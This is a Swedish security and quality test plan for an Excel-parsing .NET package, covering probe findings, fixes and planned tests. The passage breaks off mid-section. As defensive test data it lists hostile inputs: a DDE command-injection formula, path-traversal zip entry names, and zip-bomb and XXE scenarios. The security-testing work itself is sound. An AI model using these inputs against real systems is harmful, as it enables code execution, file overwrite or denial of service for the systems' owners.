# Avig.Kalkyl — testplan för kvalitet och säkerhet

Version 1, 2026-11-24. Testplanen gäller NuGet-paketet Avig.Kalkyl 0.1.0: strömläsaren
(`XlsxReader`), skrivaren (`XlsxWriter`), den typade mappningen, dokumentmodellen
(`Workbook`) och formelmotorn.

Varje testfall hör till en av tre grupper:

- **[A] Vanliga filer.** Testet körs med riktiga eller genererade Excel-filer, i vanlig CI.
- **[B] Manipulerade filer.** Testet kräver filer som byggs för att vara skadliga eller
  trasiga. De byggs i minnet i testkoden, och ofarliga varianter kan köras i CI.
- **[C] Isolerad säkerhetsmiljö.** Testet kräver en container eller VM utan nätverk och med
  begränsat minne och CPU. Det gäller till exempel zip-bomber i full storlek, långvarig
  belastning och tester som kan krascha processen.

Kör alla attacker kontrollerat, i en isolerad miljö och bara mot system du har behörighet att
testa. Inget i planen kräver att paketet anropar något utanför testmiljön. Paketet har inga
nätverksanrop.

---

## 0. Utgångsläge och fynd 2026-11-24

Det här finns redan, och planen bygger vidare på det:

| Finns | Var | Täcker |
|---|---|---|
| 1 587 enhetstester | `tests/Avig.Kalkyl.Tests` | Funktion. `FuzzFindingsTests`, `CompatibilityFindingsTests` och `LimitsTests` är regressionstester för hittade fel. |
| Schemavalidering | `A_file_with_every_feature_passes_Microsofts_schema_validation` | Det som skrivs klarar Microsofts OpenXmlValidator. |
| Kompatibilitetstester | `tests/Avig.Kalkyl.Compatibility` | 38 riktiga arbetsböcker jämförs med ExcelDataReader, ClosedXML, Sylvan och MiniExcel. 400 000 formler jämförs med de värden Excel sparade. |
| Fuzz-harness | `tools/Avig.Kalkyl.Fuzz` | Åtta mål med SharpFuzz. Varje mål är verifierat genom sabotage. Hittills har den hittat 14 fel, och alla är rättade. |
| `KalkylLimits` | `src/Avig.Kalkyl/KalkylLimits.cs` | Högst 1 GiB uppackat, 20 miljoner celler och 10 miljoner värden per matris. |

Kontroller som gjordes i koden 2026-11-24:

- Paketet har **inga** nätverksanrop (`HttpClient`, `Socket`, `WebRequest`).
- Det startar inga processer och laddar inga assemblyer (`Process`, `Assembly.Load`, `Activator`).
- Det deserialiserar inget (`BinaryFormatter`, `XmlSerializer`, `JsonSerializer`).
- Det packar inte upp något till disk. Filer skrivs bara till sökvägar som anroparen anger
  (`SaveAsync(path)`, `XlsxWriter.CreateAsync(path)`).
- Enda beroendet vid körning är Avig.Result 1.0.2, som också är ett eget paket.
  `dotnet list package --vulnerable --include-transitive` hittar inga sårbarheter.

Proberna P01 till P21 var ett engångsskript som körde 21 attackfiler mot paketet. Var och en
ska bli ett testfall i `HostileFilesTests` enligt 6.1. De här är **öppna brister**:

| Probe | Fynd | Allvar |
|---|---|---|
| P05, P06 | Text över 32 767 tecken i en fil, både delad sträng och inline, kastar ett `ArgumentOutOfRangeException` som inte fångas. Paketet lovar `Invalid` eller `InvalidDataException`. En app som bara fångar de dokumenterade felen kraschar på en uppladdad fil. | **Hög** |
| P07 | 200 000 nästlade `<r>` i en cell, i en fil på cirka 1,4 MB, tar 28 sekunder och allokerar 107 GB. Det är en CPU-DoS. Koden i Avig.Kalkyl är linjär, så kostnaden kommer troligen från .NET:s XML-hantering vid djup nästling. `KalkylLimits` stoppar det inte. | **Hög** |
| P15 | En enda cell i XFD1048576 gör att `SUM(A:XFD)` ger `#NUM!`, medan Excel ger summan. Aggregatfunktionerna bygger en matris över hela det använda området i stället för att gå igenom bara de celler som finns. Före `KalkylLimits` tog minnet slut. | Medel, funktionellt |
| P02 | Dubbla zip-poster med samma namn. Läsaren tar den första och saveren behåller en. Ett annat bibliotek kan läsa den andra, så två verktyg kan se olika innehåll i samma fil. | Medel |
| P03 | Postnamn som `../../evil.txt`, `/abs` och `C:/evil.txt` följer med oförändrade när filen sparas. Avig.Kalkyl skriver inget utanför, men en uppackare längre fram kan göra det. | Medel |
| P01 | En .xlsm öppnas, och `vbaProject.bin` sparas med. En app som tror att den "tvättar" uppladdningar genom att öppna och spara dem behåller alltså makrona. | Medel, beroende på användning |
| P11 | En fil utan `[Content_Types].xml` godtas. Excel godtar den inte. | Låg |
| P13, P17, P18 | 5 000 blad allokerar 2,2 GB. En kedja av 100 000 formler allokerar 7,4 GB under 2 sekunder, alltså cirka 74 kB per formel. Det är inte en DoS, men det ger tryck på skräpinsamlingen när många filer bearbetas samtidigt. | Låg till medel |

Proberna visade också att flera saker **håller**:

| Probe | Resultat |
|---|---|
| P04 | Ett blad som pekar på `../../Windows/win.ini` ger `Invalid`. |
| P08 | Djupt nästlade okända element utanför celler läses linjärt (0,3 s). |
| P09, P10 | DDE (`cmd|' /C calc'!A0`), externa referenser (`[1]Sheet1!A1`) och `WEBSERVICE`, `CELL("filename")` och `INFO` ger `#NAME?` eller `#REF!`. Ingen kod körs, och inga filer eller nätverk nås. `HYPERLINK` ger bara texten. |
| P12 | XXE ger `Invalid`, eftersom DTD är förbjudet. |
| P16 | En delad formel med ref över hela bladet räknas rätt. |
| P19 | En kedja av 5 000 INDIRECT räknas rätt. |
| P20 | Rekursiva definierade namn ger `#NAME?`, utan stackspill. |
| P21 | 32 parallella öppningar och omräkningar med olika gränser ger rätt svar i varje tråd. Gränsen för matriser är trådlokal. |

### Status 2026-11-24, efter åtgärderna

Alla brister i tabellen ovan är åtgärdade och har regressionstester i
`tests/Avig.Kalkyl.Tests/HostileFilesTests.cs`. Fuzzningen gav dessutom två nya fynd som också
är åtgärdade: två blad på samma del, och en post utan namn.

| Testfall | Åtgärd |
|---|---|
| SEC-01 (P07) | `DepthLimitedXmlReader` stoppar XML som är nästlad mer än 100 nivåer i alla delar som tolkas. P07 tar 10 ms och ger `Invalid`. |
| SEC-02 (P05, P06) | Text över 32 767 tecken gör filen skadad: `InvalidDataException` eller `Invalid`. |
| SEC-03 | `LimitedStream` och `CheckSize` fanns redan. `zip-raw` fuzzar zip-huvudena. |
| SEC-04 | `KalkylLimits.MaxSharedStrings`, 10 miljoner som standard. |
| SEC-05, SEC-08 | Dokumenterat i README:n, under Concurrency och Macros. `Workbook.HasMacros` och `Workbook.RemoveMacros()` finns. |
| SEC-06 | Avbrott kontrolleras per rad i matriser, i villkorsloopar och i glesa uppräkningar. |
| SEC-07 (P02, P03) | `XmlParts.CheckEntriesAsync` ger `Invalid` för dubbletter, tomma namn och namn utanför paketet. |
| SEC-09 | Testet `The_package_uses_no_network_process_deserialization_or_unsafe_code` skannar källkoden. |
| SEC-10 | `KalkylErrorKind` och `ErrorKind()` ger en felkod som går att visa: `NotFound`, `NotXlsx`, `Damaged`, `TooLarge` eller `Inaccessible`. Meddelandet är till för loggen. Fuzzern kräver en felkod för varje fil som avvisas. |
| SEC-11 | Testat, och det finns en varning i `Cell.FromFormula` och `Worksheet.SetFormula`. |
| SEC-12 | Varje post öppnas en gång när filen öppnas. En komprimeringsmetod som inte stöds och en krypterad post ger `Invalid`. |
| FUN-01 (P15) | Aggregat- och villkorsfunktioner över stora, glesa områden läser bara cellerna som finns. `SUM(A:XFD)` ger 8 på 30 ms. `SUMIF` och `SUMIFS` går via samma väg som `AVERAGEIF`. |
| S-13 (P11) | En fil utan `[Content_Types].xml` sparas med content types, så att Excel kan öppna den. |
| FUZ-02 (Z-03) | Fuzzmålet `zip-raw`, verifierat genom sabotage. |
| Z-02, Z-07 | `xlsx-part` får djup nästling och text vid gränsen 32 767, verifierat genom sabotage. |
| PRF-03 (P-11) | Öppning av 100 000 formler allokerar 1,1 GB i stället för 6,7 GB. En skrivare per blad och synkrona läsare för cellfragment. Omräkningen allokerar cirka 2 kB per formel. |
| PRF-01 | `tools/Avig.Kalkyl.Benchmarks` med BenchmarkDotNet. Baslinjen finns i `docs/benchmarks/baseline.md`. |
| SEC-10 (felkoder) | Se raden SEC-10 ovan. |
| FUN-01, PRF-01 (hela kolumner) | Cellagringen och formelindexet är omgjorda. 10 000 löpande `SUMIF(B:B,…)` tar 2,7 s i stället för 20,4 s (`docs/benchmarks/baseline.md`). |
| FUZ-01 (första körningen) | libFuzzer hittade två fel på en minut, som 50 000 smoke-indata hade missat. Det ena är ett fel i `System.Xml` i .NET 10, där en trasig XML-deklaration gav `ArgumentOutOfRangeException`. Det andra var `<sheet>` utanför `<sheets>`, som gav dubbla blad när filen sparades. Båda är rättade och har tester i `HostileFilesTests`. Efter rättningarna gav 2,6 miljoner indata inga fynd. |
| DEP-01 | NuGet Audit (`all`, `low`) och låsfiler. Restore är låst i CI. |
| FUZ-03 (Z-06) | Fuzzmålet `attribute-sweep` ger varje heltalsattribut i mallen vart och ett av 18 gränsvärden. |
| 6.3 | `tools/Avig.Kalkyl.Fuzz/corpus-check.ps1` kör varje indata i en egen process med tidsgräns och 1 GiB heap. Det är verifierat att den fångar stackspill. |

### Status 2026-11-25: aktivt innehåll och strikt zip

Efter säkerhetsanalysen i Knowledge ("World — Referens: Skadlig kod i Word- och Excel-filer")
kom två skydd till, med paketlagret Avig.OpenXml 0.1.6.

| Testfall | Åtgärd |
|---|---|
| S-10 (lokalt huvud mot central katalog, överlapp) | `KalkylLimits.StrictZip`, på som standard och i `Unlimited`: `XlsxReader` kör `OpcZip.CheckStructureAsync` innan `ZipArchive` skapas, så alla vägar in (läsaren från fil, ström och ström som inte kan söka, dokumentmodellen och den typade läsningen) avvisar en zip vars lokala huvuden och centrala katalog inte säger samma sak, med poster som överlappar eller med byte före, mellan eller efter posterna. Felkoden är `Damaged`. Tester i `StrictZipTests.cs` för varje väg in: en post som bara finns i de lokala huvudena och byte efter slutposten. Alla 38 handledningsfiler klarar kontrollen (`Every_file_passes_the_strict_zip_check_and_survives_RemoveActiveContent`). `zip-raw` fuzzar både med och utan kontrollen, så att kontrollerna bakom den också nås. |
| S-16, S-17 (aktivt innehåll) | `Workbook.ActiveContent` och `XlsxReader.GetActiveContentAsync` ger `[Flags] ActiveContent`: `Macros` (VBA, XLM-makroblad, dialogblad), `ActiveX`, `EmbeddedObjects`, `ExternalReferences` (externa länkar till arbetsböcker, DDE-länkar och andra externa relationer utom hyperlänkar) och `DataConnections` (connections.xml, frågetabeller, Power Query). `Workbook.ExternalReferences` listar länkarna. `RemoveActiveContent()` tar bort allt detta vid nästa sparning, och formler mot andra arbetsböcker ersätts med sitt senaste värde. En del som inget längre pekar på följer med ut. Det som inte går att ta bort utan att arbetsboken går sönder ger `Invalid`: en pivottabell eller datamodell (Power Pivot) som hämtar från en anslutning, och ett diagram som ritas från en annan arbetsbok. Tester i `ActiveContentTests.cs`, en per sorts innehåll för upptäckt och för borttagning, byggda av XML som Excel 365 skrev. |
| Bladlistan | Sparningen skriver nu bladlistan med diagram-, makro- och dialogblad kvar på sina platser, så att `localSheetId` och `activeTab` fortsätter att stämma. Förut föll de bort ur `<sheets>`, och en fil från Excel med ett makroblad före kalkylbladet gick inte att öppna i Excel efter att ha sparats. |
| FUN-04 (aktivt innehåll) | 2026-11-25 i Excel 365 via COM: en fil som Excel själv skapat med makroblad, dialogblad, OLE-objekt, extern länk, frågetabell och Power Query öppnades utan reparation både efter vanlig sparning och efter `RemoveActiveContent`, liksom en med en Power Query-tabell och en formulärknapp. ActiveX gick inte att lägga in via COM på maskinen, så ActiveX finns bara i de handskrivna testfilerna och i ExcelCheck-fil 13. Alla 85 ExcelCheck-filer, med den nya fil 13 (allt aktivt innehåll borttaget), och de 30 handledningsfiler som går att rensa öppnades utan reparation efter rensningen. De övriga 8 har en datamodell och vägras. En kontrollfil med ett trasigt index till de delade strängarna vägrades, vilket visar att kontrollen fungerar. |

### Status 2026-11-25: former, grupper, SVG, diagramval, bladvy och hyperlänkar

För att kunna bygga dashboards som Excels mallar (mörka kort med toningar och skuggor, en
navigeringsspalt med länkade knappar och SVG-ikoner, ringdiagram som mätare, tratt av staplade
staplar, kombinerade diagram) kom former (`Shape`, `ShapeGroup`), SVG-bilder, fler diagramval,
`SheetView` och hyperlänkar i celler till, i båda skrivarna. Förebilden var en dashboardmall som
Excel sparat (inte incheckad, den är tredje parts).

| Testfall | Åtgärd |
|---|---|
| Schemat | `DashboardTests.cs` kontrollerar XML:en mot det Excel skriver och mot Microsofts schema för varje formtyp, fyllning, kontur, skugga, text, länk, grupp, SVG och diagramval, i båda skrivarna. `A_file_with_every_feature_passes_Microsofts_schema_validation` täcker alla nya funktioner i den strömmande skrivaren. |
| Rundtur | Dashboarden (`DashboardWorkbook.cs`, från båda skrivarna) öppnas och sparas igen av dokumentmodellen: alla delar finns kvar och ritningar, diagram och media är byte för byte. Former och diagram som läggs till en öppnad ritning får nya id:n och relationer efter filens egna. Vy, flikfärg och länkar i en öppnad fil skrivs om utan att det modellen inte känner till försvinner (`sheetPr`-attribut, en temafärg på fliken, `view="pageLayout"`, filens egna länkar). |
| Mallen | `DashboardTemplateTests` i kompatibilitetsprojektet öppnar mallen om `KALKYL_DASHBOARD_TEMPLATE` pekar på den (annars hoppas testet över), sparar den oförändrad och med tillägg, och kräver att alla 483 delar finns kvar (utom `calcChain.xml`, som släpps med avsikt) och att ritningar, diagram, media, pivottabeller och utsnitt är byte för byte. Körd 2026-11-25: godkänd. |
| Fientlig indata | `Picture.FromSvg` läser bara rotelementet med en egen `XmlReader` som hoppar över DTD:n: en entitetsbomb ger `Invalid`, och en extern DTD hämtas aldrig. Text som XML inte kan hålla (styrtecken, halva surrogatpar) i former, länktips, diagramtitlar och serienamn ger `ArgumentException` när den sätts, inte ett fel när filen sparas. |
| FUZ (`roundtrip`) | Målet lägger nu också varje text i en textruta, som text och alternativ text, och läser tillbaka den ur ritningens XML som Excel läser den (en rad per stycke). |
| FUN-04 (dashboard) | 2026-11-25 i Excel 365 via COM (`tools/Avig.Kalkyl.ExcelCheck/open-in-excel.ps1`): ExcelCheck-fil 14 och 15 (dashboarden från dokumentmodellen och den strömmande skrivaren) och fil 16 (varje formtyp, streckmönster, effekt och diagramval, alla tillåtna etikettpositioner, sekundär axel, höger till vänster) öppnades utan reparation, liksom mallen efter rundtur med och utan tillägg. Skriptet visade sig behöva en ändring: med `DisplayAlerts = $false` reparerar Excel inte tyst, utan `Workbooks.Open` kastar för en fil som behöver repareras (provat med ett trasigt stilindex, ett diagram utan axel-id och trasig XML). Dashboarden renderades också via `CopyPicture` och granskades: kort, toningar, skuggor, SVG-ikoner, länkar (via `Shape.Hyperlink`), markerad stapel, mjuk linje, mätare och tratt såg ut som avsett. |

### Status 2026-11-25: pivottabeller och utsnitt

Dokumentmodellen skapar pivottabeller (`Worksheet.AddPivotTable`) och utsnitt
(`Worksheet.AddSlicer`), listar dem som en fil har (`Workbook.PivotTables`, `PivotCaches`),
markerar en mall så att Excel uppdaterar pivotcachen när filen öppnas
(`RefreshPivotTablesOnOpen`), och GETPIVOTDATA räknas. Facit är Excel 365 självt: en arbetsbok
med samma data och sju pivottabeller skapades via COM, och delarna Excel sparade är förebilden.

| Testfall | Åtgärd |
|---|---|
| PIV-01 (layout) | `PivotTests` bygger samma sju pivottabeller som Excel-filen (kompakt, disposition och tabell, två radfält, kolumnfält, flera värdefält, filterfält, inga totaler, värden utan rader, kolumnfält utan rader) och nio till. Cellerna, `location`, `pivotFields`, `rowItems`, `colItems` och `pageFields` är desamma som Excel skrev, tecken för tecken. Excel 365 öppnade paketets filer, uppdaterade pivotcachen (`refreshOnLoad`) och visade exakt de celler paketet skrivit, för alla 16 tabeller (`TableRange2` läst via COM). Fyndet då: `rowGrandTotals` är totalraden längst ner, inte kolumnen till höger. |
| PIV-02 (cachen) | Cachedefinitionen har samma `sharedItems` som Excel skrev för samma data, och posterna är lika med källcellerna (`The_cache_records_equal_the_source_cells`). Text, tal, datum, blanka, fel och sanningsvärden i samma kolumn ger Excels attribut. |
| PIV-03 (utsnitt) | Utsnittscachen, utsnittsdelen, ankaret i ritningen (`mc:AlternateContent` med `sle:slicer`), bladets och arbetsbokens `extLst` och namnet `Slicer_…` skrivs som Excel skriver dem. Via COM: utsnitten var kopplade till båda pivottabellerna, och ett klick (`SlicerItems(...).Selected`) filtrerade båda och ändrade GETPIVOTDATA i formlerna. Fallbackformens `cNvPr id="0"`, som Excel skriver, underkänns av schemavalidatorn, så den får formens eget id. |
| PIV-04 (öppna och spara) | En fil med pivottabeller och utsnitt öppnas och sparas med alla delar oförändrade, också efter `RemoveActiveContent` (pivottabeller på blad blockerar inte, de på en anslutning gör det fortfarande). Referensinstrumentpanelen från Excel (12 blad, 113 diagram, 8 utsnitt, en pivotcache på en tabell) öppnades, räknades om och sparades; Excel öppnade den utan reparation, och GETPIVOTDATA-formlerna gav samma värden som Excel. Samma fil med en ny pivottabell på tabellen `mydata` och ett utsnitt, och med `RefreshPivotTablesOnOpen` och ändrade data, öppnades också utan reparation. Referensfilen ligger inte i repot. |
| PIV-05 (trasiga delar) | En pivotdel eller cachedefinition som inte är XML hindrar inte att filen öppnas; tabellen saknas i listan, GETPIVOTDATA ger `#REF!`, och delen sparas som den var (`A_pivot_part_that_is_not_XML_leaves_the_file_open_and_kept`). |
| PIV-06 (fuzz) | `roundtrip` gör också en pivottabell av cellerna, med första raden som rubriker: den ger ett resultat i stället för ett undantag, filen öppnas igen med en tabell och en cache med varje rad, och GETPIVOTDATA:s totalsumma är antalet värden i den räknade kolumnen. |
| FUN-04 (pivot) | ExcelCheck-fil 17 (instrumentpanel: data, två pivottabeller, utsnitt för år och månad kopplade till båda, diagram över GETPIVOTDATA) och 18 (fil 17 som mall med nya data och `RefreshPivotTablesOnOpen`) öppnades utan reparation i Excel 365 via COM. Fil 17 visade samma celler före och efter Excels uppdatering, fil 18 visade de nya talen efter uppdateringen. |

Inte gjort: pivottabeller i strömskrivaren (källan är redan skriven när tabellen kunde räknas ut),
beräknade fält och objekt, gruppering av datum och tal, sortering efter värde, värdefältet på
rader, pivottabeller på anslutningar och datamodellen, och tidslinjer.

Det som återstår kräver en miljö eller ett beslut:

- **FUN-04:** öppna filerna i riktiga Excel. `tools/Avig.Kalkyl.ExcelCheck` skapar filerna, och de är kontrollerade mot schemat. Fil 10–12 (diagram, bilder och villkorsstyrd formatering, också tillagda i de 38 handledningsfilerna) gav inga nya schemafel 2026-11-24, och filernas egna diagram, bilder och regler fanns kvar. Samma dag öppnades alla 84 filer automatiskt i Excel 365 (16.0, build 20625) via COM. Ingen fil behövde repareras eller vägrades. En kontrollfil med en trasig rad vägrades, vilket visar att kontrollen fungerar. Efter full omräkning (Ctrl+Alt+F9) hade inga värden ändrats, utom de som beror på `RANDBETWEEN` i `class-correlation`. Det som kräver ögon i `docs/excel-checklista.md` återstår: diagrammens och formateringens utseende, makrona i fil 07 och 08 och jämförelsen med originalen.
- **FUZ-01:** libFuzzer är installerat och har körts i tre minuter per paketmål (se nedan). En hel natt med `tools/Avig.Kalkyl.Fuzz/fuzz-night.ps1` återstår. `schedule-night.ps1` lägger den i Schemaläggaren varje natt.
- **SEC-03 i full storlek, SEC-05, PRF-02 och P-07 till P-09:** de kräver en isolerad container
  och kör i timmar.
- **FUZ-03 (Z-06):** svepet över heltalsattribut är inte byggt.
- **6.3:** barnprocessen för korpusen är inte automatiserad.
- **DEP-02:** licenskontroll och SBOM i CI. Repot har ingen CI än.

---

## 1. Funktionella tester

Varje test anges med syfte, scenario, testdata, förväntat resultat och vad som kan gå fel. "Täckt
av" pekar på befintliga tester, och "Saknas" är det som ska skrivas.

### F-01 Filformat: XLSX, XLSM, XLTX och XLS [A]
- **Syfte:** paketet ska känna igen vad det kan läsa och tydligt avvisa resten.
- **Scenario:** öppna en fil av varje sort med `XlsxReader.OpenAsync` och `Workbook.OpenAsync`.
- **Testdata:**
  - .xlsx från Excel.
  - .xlsm med `vbaProject.bin`.
  - .xltx (mallar).
  - .xls (BIFF8, OLE-container).
  - .xlsb (binär).
  - .ods.
  - .csv med namnet .xlsx.
  - .docx med namnet .xlsx.
  - En lösenordsskyddad .xlsx, som är krypterad i en OLE-container.
- **Förväntat:**
  - xlsx, xlsm och xltx kan läsas.
  - xls och den krypterade filen är båda OLE-containrar, och de ger samma `Invalid`: "either an old .xls workbook or a password-protected .xlsx".
  - xlsb och ods ger `Invalid`.
  - docx ger `Invalid` med meddelandet "no workbook part".
  - En xlsm som sparas behåller `vbaProject.bin` och innehållstypen för makron. Det är verifierat (P01).
- **Kan gå fel:** OLE-signaturen tolkas som zip, en xlsm sparas om som en xlsx så att Excel
  vägrar öppna den, eller makron försvinner tyst.
- **Täckt av:** `ReaderTests` (docx, gammal xls). **Saknas:** xlsb, ods, krypterad fil och xltx.

### F-02 Tomma filer [A]
- **Syfte:** gränsfallen "ingenting" ska inte krascha.
- **Scenario och testdata:**
  - En fil på 0 byte.
  - En tom zip.
  - En arbetsbok utan blad.
  - Ett blad utan `sheetData`.
  - `<sheetData/>`.
  - Ett blad med bara formatering och inga värden.
- **Förväntat:**
  - 0 byte och en tom zip ger `Invalid`.
  - Ett tomt blad ger noll rader.
  - `Workbook.RowCount` är 0.
  - `Evaluate` ger "no sheets" när det inte finns några blad.
- **Kan gå fel:** `IndexOutOfRange` på `Sheets[0]`, eller en tom `<v/>` som tolkas som 0.
- **Täckt av:** delvis, `fileformat-blank.xlsx` i kompatibilitetstesterna. **Saknas:** 0 byte och en tom zip.

### F-03 Mycket stora filer [A][C]
- **Syfte:** strömläsaren ska hålla minnet konstant, och dokumentmodellen ska stanna vid sina gränser.
- **Scenario:** generera filer på 10, 100 och 500 MB med `XlsxWriter`. Läs dem med `ReadRowsAsync` och `Workbook.OpenAsync`.
- **Förväntat:**
  - Strömläsaren använder mindre än 100 MB arbetsminne, oavsett filstorlek.
  - Dokumentmodellen ger `Invalid` vid `MaxCells` och ingen `OutOfMemoryException`.
- **Kan gå fel:** delade strängar läses in helt, även i strömläget. 1 GiB uppackade delade
  strängar kan bli flera GB i minnet. Se S-04.
- **Saknas.** Se P-01 och P-02.

### F-04 Många kalkylblad [A]
- **Testdata:**
  - 1, 255 och 5 000 blad. 5 000 är verifierat (P13).
  - Bladnamn som bara skiljer sig i skiftläge.
  - Bladnamn med `'`, `!` och Unicode.
  - Blad som bara finns i `workbook.xml`.
  - Blad som pekar på samma del.
  - Diagramblad.
- **Förväntat:**
  - Alla blad listas i rätt ordning.
  - Diagramblad listas inte som kalkylblad.
  - Ett blad som saknar sin del ger `Invalid` från `Sheet(index)`, och de andra går att läsa.
- **Kan gå fel:** blad med samma namn bara i olika skiftläge kolliderar i `Sheet(name)`, eller två blad som delar en del skrivs två gånger när filen sparas.
- **Täckt av:** `ReaderTests` och fuzzmålet `xlsx-part`. **Saknas:** blad som delar en del.

### F-05 Stora mängder rader och kolumner [A]
- **Testdata:**
  - Rad 1 048 576 och kolumn XFD.
  - Rad 1 048 577, som ska ge `Invalid`.
  - En cell utan `r` efter XFD.
  - `<row>` utan `r`.
  - Rader i fel ordning (5, 3, 4).
  - Två `<row r="2">`.
- **Förväntat:**
  - Gränsvärdena kan läsas.
  - Värden utanför bladet ger skadad fil.
  - Rader i fel ordning läses som de står.
  - Dubbla rader ger skadad fil, eller så vinner den sista. Det är **inte bestämt än**.
- **Täckt av:** `FuzzFindingsTests` (rad 1 048 577). **Saknas:** dubbla rader. Där behövs ett beslut om beteendet.

### F-06 Datatyper [A]
- **Testdata:**
  - Varje typ som `t=` kan ha: `n`, `s`, `str`, `inlineStr`, `b`, `e`, `d` och en okänd typ.
  - Formatkoder för datum, både inbyggda (14–22, 45–47) och egna.
  - 1904-systemet.
  - Det påhittade 1900-02-29.
  - Talen `-0`, `1E-310` och `1.7976931348623157E308`.
- **Förväntat:** samma värde som majoriteten av ExcelDataReader, ClosedXML, Sylvan och MiniExcel.
- **Täckt av:** `RoundTripTests`, `ValueTests`, `ReaderTests`, kompatibilitetstesterna och fuzzmålet `roundtrip`.

### F-07 Felaktiga datum, tal och text [A][B]
- **Testdata:**
  - `<v>abc</v>` i en talcell.
  - `<v>1e309</v>`, `NaN` och `Infinity`.
  - Datumserienummer under 0 och över 2 958 466.
  - `t="b"` med `<v>2</v>`.
  - `t="e"` med en okänd kod.
  - `t="d"` med text som inte är ISO 8601.
  - Text som ser ut som ett tal (`"1,5"`), i mappningen och i formler.
- **Förväntat:**
  - Strömläsaren ger `InvalidDataException`, och dokumentmodellen ger `Invalid`.
  - En okänd felkod blir `#N/A`.
  - Mappningen ger `Invalid` för raden med cellens adress.
- **Täckt av:** `FuzzFindingsTests` och `MappingTests`. **Brist:** text över 32 767 tecken (P05) ger fel undantag. Se S-20.

### F-08 Saknade värden och null [A]
- **Testdata:**
  - `<c r="A1"/>`, `<v/>` och `<is/>`.
  - En cell med bara stil.
  - En kolumn som saknas helt i mappningen.
  - En nullbar egenskap.
  - Ett obligatoriskt fält som är tomt.
- **Förväntat:**
  - `CellValue.Empty`.
  - Mappningen ger null för nullbara egenskaper och `Invalid` för obligatoriska.
- **Täckt av:** `MappingTests`.

### F-09 Specialtecken och Unicode [A]
- **Testdata:**
  - Emoji, alltså surrogatpar.
  - Ensamma surrogat.
  - U+FFFE och U+FFFF.
  - Styrtecken 0x00–0x1F.
  - `_x0041_` som bokstavlig text.
  - RTL-text.
  - Kombinerande diakriter.
  - `\r`, `\r\n` och `\n`.
  - Inledande och avslutande mellanslag.
  - Bladnamn med Unicode.
  - NFC och NFD.
- **Förväntat:** en rundtur ger samma text, och den skrivna filen klarar schemavalideringen.
- **Täckt av:** fuzzmålen `cell-text` och `roundtrip`, `FuzzFindingsTests` och `CompatibilityFindingsTests`.

### F-10 Dolda blad, rader och kolumner [A]
- **Testdata:**
  - `state="hidden"` och `"veryHidden"`.
  - `<row hidden="1">`.
  - `<col hidden="1">`.
  - Ett dolt blad som innehåller formler som det synliga bladet använder.
- **Förväntat:**
  - Dolda blad läses och visas i `SheetInfo.Visibility`.
  - Dolda rader läses.
  - Synligheten följer med när filen sparas.
- **Kan gå fel:** en app tror att den bara visar synligt innehåll, men dolda blad läses också. Se S-17.
- **Täckt av:** `ReaderTests` och `DocumentTests`. **Saknas:** dolda rader och kolumner som följer med när filen sparas.

### F-11 Formler och beräknade värden [A]
- **Testdata:**
  - Kompatibilitetsfilerna, med 400 000 formler.
  - Delade formler och matrisformler.
  - Cirkelreferenser.
  - Flyktiga funktioner.
  - Datumtext i andra kulturer.
  - Kedjor med 100 000 formler (P18).
- **Förväntat:**
  - Omräkningen ger de värden Excel sparade, med de dokumenterade avvikelserna.
  - Cirkelreferenser ger 0 och syns i rapporten.
- **Täckt av:** `FormulaEngineTests`, `Functions/*Tests`, kompatibilitetstesterna och fuzzmålet `formula-sweep`. **Brist:** P15, där aggregatfunktioner över hela kolumner bygger en matris.

### F-12 Korrupta och felformaterade filer [B]
- **Testdata:** trasig XML i varje del, en zip som är avkortad, fel CRC och dubbla poster.
- **Förväntat:** `Invalid` eller `InvalidDataException`, aldrig något annat undantag.
- **Täckt av:** fuzzmålet `xlsx-part` och `FuzzFindingsTests`. **Saknas:** zip-nivån. Se Z-03.

---

## 2. Säkerhetstester och attackscenarier

Varje attack beskrivs med hur den fungerar, hur den riktas mot ett paket som läser Excel, hur
den testas kontrollerat, vad man ska observera och vilka skydd som ska finnas.

### 2.1 DoS och överbelastning

**S-01 Mycket stor fil [C]**
- **Attack:** en uppladdning på flera GB som läses in helt i minnet.
- **Mot paketet:**
  - `Workbook.OpenAsync(path)` läser hela filen med `File.ReadAllBytesAsync`.
  - `OpenAsync(stream)` kopierar strömmen.
  - En ström som inte går att söka i kopieras också.
- **Test:**
  - Skapa en fil på 2 GB, till exempel en giltig zip med en okomprimerad bilaga.
  - Öppna den med standardgränserna i en container med `--memory=2g`.
- **Observera:**
  - Svaret ska vara `Invalid` med meddelandet "larger than … MaxUncompressedBytes".
  - Arbetsminnet ska inte stiga till flera GB, och processen ska inte avslutas med OOM.
- **Skydd:** den storlekskontroll som redan finns i `Workbook.OpenAsync` och `CopyLimitedAsync`. Appen bör ha en egen gräns i webbservern (`MaxRequestBodySize`).

**S-02 Zip-bomb och dekompressionsbomb [B][C]**
- **Attack:** en del som komprimeras 1000:1 eller mer. Till exempel blir 10 MB nollor packade till 10 kB. Nästlade bomber, alltså zip i zip, är inte relevanta, eftersom paketet aldrig packar upp inre zip-filer.
- **Mot paketet:**
  - `sheet1.xml` eller `sharedStrings.xml` på 10 GB uppackat.
  - Ett zip-huvud som anger 1 kB men innehåller 10 GB.
- **Test:**
  - I CI med en liten gräns: `KalkylLimits.Default with { MaxUncompressedBytes = 50_000 }`. Det testet finns redan i `LimitsTests`.
  - I [C] i full storlek, med en generator som strömmar data (exempel i avsnitt 6.2).
  - Ett falskt huvud kräver att man patchar fälten för storlek i både den lokala posten och den centrala katalogen.
- **Observera:**
  - Svaret ska vara `Invalid` innan något läses, inom mindre än 100 ms.
  - Ett falskt huvud ska ge `InvalidDataException` med meddelandet "unpacks to more than … its zip header gives".
- **Skydd:** `XmlParts.CheckSize` och `LimitedStream` finns redan. **Saknas:** ett test med falskt huvud mot en riktig zip-fil. `LimitedStream` är testad direkt.

**S-03 Miljontals celler [A][C]**
- **Attack:** 17 miljarder celler går inte att skriva, men 50 miljoner små celler komprimeras till under 100 MB.
- **Test:** en fil med 30 miljoner celler. Dokumentmodellen ska ge `Invalid` vid `MaxCells`, och strömläsaren ska klara filen med konstant minne.
- **Observera:** toppminnet, alltså `PeakWorkingSet64`, och tiden.
- **Skydd:** `MaxCells` finns. Strömläsaren påverkas inte, men har ingen tidsgräns utan `CancellationToken`.

**S-04 Extrem minnesförbrukning via delade strängar [B]**
- **Attack:** `sharedStrings.xml` med 60 miljoner korta strängar. Det ryms inom 1 GiB uppackat. Alla strängar läses in vid `OpenAsync`, även i strömläget.
- **Test:** 2 miljoner strängar (P14) gav 2 GB allokerat på 2,5 sekunder. Skala upp till 50 miljoner i [C].
- **Observera:** toppminnet. 50 miljoner strängar kan bli 3–5 GB.
- **Skydd som saknas:**
